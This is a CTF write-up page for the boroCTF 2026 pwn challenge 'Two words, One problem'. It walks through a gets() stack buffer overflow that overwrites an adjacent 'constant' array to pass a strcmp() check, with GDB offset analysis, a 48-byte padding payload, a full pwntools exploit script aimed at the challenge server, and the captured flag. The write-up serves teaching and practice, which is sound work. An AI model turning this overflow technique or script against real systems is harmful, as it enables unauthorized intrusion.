@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Two words, One problem | M0x46</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="container">
+    <aside class="sidebar">
+      
+<div class="profile">
+    <img src="images/cat-profile.jpg" alt="M0x46 Profile">
+    <h1>M0x46</h1>
+    <p>CTF Player | Aspiring Penetration Tester</p>
+</div>
+
+        
+<nav>
+    <a href="index.html">⌂ Home</a>
+    <a href="about.html">◉ About</a>
+    <a href="index.html#writeups">⌘ Write-ups</a>
+    <a href="categories.html" class="active">▤ Categories</a>
+    <a href="achievements.html">★ Achievements</a>
+</nav>
+
+    </aside>
+
+    <main class="content">
+        <header>
+            <h2><a class="back-link" href="index.html">Home</a> / Write-up</h2>
+        </header>
+
+        <article class="writeup">
+            <h1>boroCTF 2026: [Pwn] Two words, One problem — Stack Buffer Overflow and Variable Overwrite</h1>
+            <p class="article-meta">Oct 17, 2026 · M0x46 · 5 min read</p>
+
+            <div class="article-tags">
+                <span class="tag">Pwn</span>
+                <span class="tag">Buffer Overflow</span>
+                <span class="tag">boroCTF 2026</span>
+            </div>
+
+            <blockquote>
+                <strong>Summary:</strong> I solved Two words, One problem
+                by exploiting a stack-based buffer overflow. The
+                program used gets() on a 37-byte buffer. A 48-byte
+                offset allowed me to overwrite an adjacent variable
+                and pass the strcmp() check.
+            </blockquote>
+
+            <h2>Challenge Overview</h2>
+            <p>
+                Two words, One problem was a Pwn challenge from
+                boroCTF 2026, authored by Franklin.
+            </p>
+            <p>The challenge description was:</p>
+            <blockquote>The first time pwn solves problems.</blockquote>
+            <p>
+                We were given a compiled ELF binary and its C source
+                code. The goal was to bypass a string comparison
+                and make the program read flag.txt.
+            </p>
+
+            <h2>Challenge Information</h2>
+            <table>
+                <tr><th>CTF</th><td>boroCTF 2026</td></tr>
+                <tr><th>Challenge</th><td>Two words, One problem</td></tr>
+                <tr><th>Category</th><td>Pwn</td></tr>
+                <tr><th>Author</th><td>Franklin</td></tr>
+                <tr><th>Vulnerability</th><td>Stack Buffer Overflow</td></tr>
+                <tr><th>Technique</th><td>Adjacent Variable Overwrite</td></tr>
+                <tr><th>Files</th><td>chal, two.c</td></tr>
+            </table>
+
+            <h2>Recon and Analysis</h2>
+            <p>
+                I started by extracting the challenge files
+                and inspecting the binary.
+            </p>
+            <pre><code>unzip chal.zip
+ls -la
+file chal
+checksec --file=chal
+cat two.c</code></pre>
+
+            <p>Inside main(), I found two local arrays:</p>
+            <pre><code>#define BUFFSIZE 37
+#define FLAGSIZE 64
+
+char non_constant[BUFFSIZE] = "I love";
+const char constant[BUFFSIZE] = "barackCTF";</code></pre>
+
+            <p>The program provided two operations:</p>
+            <pre><code>check(non_constant, constant);
+change(non_constant);</code></pre>
+
+            <p>The important function was check():</p>
+            <pre><code>void check(char *nc, const char *c) {
+    char flag[FLAGSIZE];
+
+    printf("Checking...\n");
+
+    if (strcmp(c, "boroCTF") == 0) {
+        FILE *f = fopen("flag.txt", "r");
+        fgets(flag, FLAGSIZE, f);
+        printf("%s\n", flag);
+    } else {
+        printf("Nope!\n");
+    }
+}</code></pre>
+
+            <p>
+                To print the flag, the value of constant
+                had to become "boroCTF". However, it was
+                initially set to "barackCTF".
+            </p>
+
+            <h2>Root Cause</h2>
+            <p>The vulnerability was inside change():</p>
+            <pre><code>void change(char *nc) {
+    printf("What would like to write?\n> ");
+    gets(nc);
+}</code></pre>
+
+            <p>
+                The gets() function does not check the destination
+                buffer size. Since non_constant only holds 37 bytes,
+                a longer input can overwrite adjacent stack memory.
+            </p>
+            <p>
+                Although constant was declared with the const keyword,
+                that does not protect its stack memory from corruption
+                caused by an out-of-bounds write.
+            </p>
+
+            <h2>Exploitation</h2>
+            <h3>1. Finding the Offset</h3>
+            <p>I used GDB to inspect the stack layout:</p>
+            <pre><code>gdb -q ./chal
+set disassembly-flavor intel
+disassemble main</code></pre>
+
+            <p>The relevant offsets were:</p>
+            <pre><code>non_constant -> rbp - 0x90
+constant     -> rbp - 0x60
+
+0x90 - 0x60 = 0x30 = 48 bytes</code></pre>
+
+            <p>
+                So I needed 48 bytes of padding to reach
+                the beginning of constant.
+            </p>
+
+            <h3>2. Building the Payload</h3>
+            <pre><code>padding = b"A" * 48
+target = b"boroCTF"
+payload = padding + target</code></pre>
+
+            <p>
+                The payload fills the first buffer, crosses
+                the padding between the arrays, and overwrites
+                constant with "boroCTF".
+            </p>
+            <pre><code>Before:
+non_constant = "I love"
+constant     = "barackCTF"
+
+After:
+non_constant = "AAAA..."
+constant     = "boroCTF"</code></pre>
+
+            <h3>3. Triggering the Check</h3>
+            <p>
+                After sending the payload, I selected the
+                check option. The strcmp() condition now
+                returned zero, allowing the program to
+                enter the flag-reading branch.
+            </p>
+
+            <h2>Full Exploit Script</h2>
+            <p>I automated the exploitation using Pwntools.</p>
+            <pre><code>#!/usr/bin/env python3
+from pwn import *
+
+HOST = "1xgu8bd1niap.boroctf.com"
+PORT = 34069
+
+context.log_level = "info"
+
+OFFSET = 48
+TARGET = b"boroCTF"
+
+def build_payload():
+    return b"A" * OFFSET + TARGET
+
+def exploit(io):
+    payload = build_payload()
+
+    log.info(f"Offset: {OFFSET}")
+    log.info(f"Payload: {payload!r}")
+
+    io.sendlineafter(b"> ", b"2")
+    io.sendlineafter(b"> ", payload)
+    io.sendlineafter(b"> ", b"1")
+
+    io.interactive()
+
+if __name__ == "__main__":
+    if args.LOCAL:
+        io = process("./chal")
+    else:
+        io = remote(HOST, PORT)
+
+    exploit(io)</code></pre>
+
+            <p>Run locally:</p>
+            <pre><code>python3 solve.py LOCAL</code></pre>
+
+            <p>Or against the original CTF service:</p>
+            <pre><code>python3 solve.py</code></pre>
+
+            <h2>Result</h2>
+            <p>The program printed the flag:</p>
+            <pre><code>boroCTF{I_c@n_7ix_tH%s}</code></pre>
+
+            <h2>Takeaways</h2>
+            <ul>
+                <li>gets() is unsafe because it does not enforce buffer limits.</li>
+                <li>Buffer overflows can modify program data without overwriting a return address.</li>
+                <li>The const keyword does not prevent memory corruption.</li>
+                <li>GDB can help identify stack offsets.</li>
+                <li>Bounded input functions should replace gets().</li>
+            </ul>
+
+            <hr>
+            <p><a class="back-link" href="index.html">← Back to Home</a></p>
+        </article>
+    </main>
+</div>
+<script src="script.js"></script>
+</body>
+</html>
